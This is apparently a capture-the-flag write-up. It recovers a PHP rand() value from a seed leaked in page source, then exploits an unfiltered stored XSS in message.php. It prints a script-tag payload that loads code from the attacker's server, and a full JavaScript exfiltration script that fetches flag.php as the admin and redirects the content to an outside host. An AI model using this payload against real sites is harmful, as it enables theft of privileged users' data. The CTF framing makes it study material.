First of all, find a clue in the html source code: 
* the body1 is the seed
* the body1 is the rand1 (random number 1)

so, we try to generate a random code with the following code( the php version should be consistent with that in the server):

srand($seed);
echo rand();
$res = rand();
echo $res;

Here, the $res is what the challenge wants. Then we are guided to message.php, This is obviously an arbitrary XSS vulnerability without any filter,the payload we try to send like this:

<script src='http://xx.xx.xx.xx/xx.js'></script>

When the victim admin view this msg, he/she will send the page content of flag.php to you. ( you need to modify the code below, and deploy with your own server )

javascript payload:
```js
var pkav = { ajax: function () { var xmlHttp; try { xmlHttp = new XMLHttpRequest(); } catch (e) { try { xmlHttp = new ActiveXObject('Msxml2.XMLHTTP'); } catch (e) { try { xmlHttp = new ActiveXObject('Microsoft.XMLHTTP'); } catch (e) { return false; } } } return xmlHttp; }, req: function (url, data, method, callback) { method = (method || '').toUpperCase(); method = method || 'GET'; data = data || ''; if (url) { var a = this.ajax(); a.open(method, url, true); if (method == 'POST') { a.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); } a.onreadystatechange = function () { if (a.readyState == 4 && a.status == 200) { if (callback) { callback(a.responseText); } } }; if ((typeof data) == 'object') { var arr = [ ]; for (var i in data) { arr.push(i + '=' + encodeURIComponent(data[i])); } a.send(arr.join('&')); } else { a.send(data || null); } } }, get: function (url, callback) { this.req(url, '', 'GET', callback); }, post: function (url, data, callback) { this.req(url, data, 'POST', callback); } }; pkav.get('flag.php',function(data){ window.location.href="http://xx.xx.xx.xx/?a=1&"+'code='+encodeURIComponent(data)});
```

